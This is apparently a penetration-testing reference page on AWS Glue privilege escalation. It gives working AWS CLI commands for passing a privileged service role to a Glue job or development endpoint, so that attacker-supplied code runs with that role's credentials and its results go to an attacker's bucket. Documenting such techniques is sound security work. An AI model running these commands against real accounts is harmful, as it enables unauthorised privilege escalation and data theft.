---
title: "Glue: PassRole into a job or dev endpoint"
description: "iam:PassRole into a Glue job or development endpoint to execute code under a privileged Glue service role."
keywords:
  - PassRole
  - Glue
  - job
  - dev endpoint
  - service role
---

# Glue

AWS Glue runs ETL jobs and development endpoints under a service role. With `iam:PassRole` and `glue:CreateJob` (or `glue:CreateDevEndpoint`), you attach a privileged role to a job whose script is yours, then start it, running your code with the passed role's credentials.

## Job path

```bash
aws glue create-job --name x \
  --role arn:aws:iam::<acct>:role/<privileged-glue-role> \
  --command '{"Name":"pythonshell","ScriptLocation":"s3://you/script.py"}'
aws glue start-job-run --job-name x
```

The script at `ScriptLocation` runs as the Glue role; have it call STS or perform the privileged action and write results to a bucket you read.

## Dev endpoint path

A development endpoint is a long-lived box you can SSH into; `glue:CreateDevEndpoint` with a public key gives an interactive shell as the role. The update variant is covered under [existing resources](../existing-resources/update-dev-endpoint.md).

## Exploitation notes

- Glue roles are commonly over-permissioned for data access (S3, Lake Formation, catalog), so the passed role often reaches far beyond Glue itself.
- A `pythonshell` job is the lightest footprint; a Spark job also works but spins up more infrastructure.

## Tools

- **AWS CLI** (`glue create-job` / `start-job-run` / `create-dev-endpoint`).
- **Pacu**: Glue privesc modules.

## References

- [Rhino Security Labs: AWS privilege escalation (Glue)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks Cloud: AWS Glue privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-glue-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
